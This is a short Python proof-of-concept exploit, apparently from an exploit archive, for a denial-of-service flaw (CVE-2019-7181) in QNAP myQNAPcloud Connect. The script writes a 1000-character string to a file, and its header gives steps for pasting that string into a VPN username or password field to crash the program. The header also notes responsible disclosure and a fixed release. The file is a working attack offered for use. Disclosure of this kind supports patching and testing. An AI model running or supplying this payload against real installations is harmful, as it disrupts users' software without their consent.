#!/usr/bin/python
# Exploit Title: QNAP myQNAPcloud Connect "Username/Password" DOS
# Date: 19/04/2019
# Exploit Author: Dino Covotsos - Telspace Systems
# Vendor Homepage: https://www.qnap.com
# Version: 1.3.4.0317 and below are vulnerable
# Software Link: https://www.qnap.com/en/utilities/essentials
# Contact: services[@]telspace.co.za
# Twitter: @telspacesystems (Greets to the Telspace Crew)
# Tested on: Windows XP/7/10 (version 1.3.3.0925)
# CVE: CVE-2019-7181
# POC
# 1.) Generate qnap.txt
# 2.) Copy the contents of qnap.txt to the clipboard
# 3.) Paste the contents in any username/password field(Add or Edit VPN)
# 4.) Click ok, program crashes.
# This vulnerability was responsibly disclosed February 3, 2019, new version has been released.

buffer = "A" * 1000

payload = buffer
try:
    f=open("qnap.txt","w")
    print "[+] Creating %s bytes QNAP payload.." %len(payload)
    f.write(payload)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created"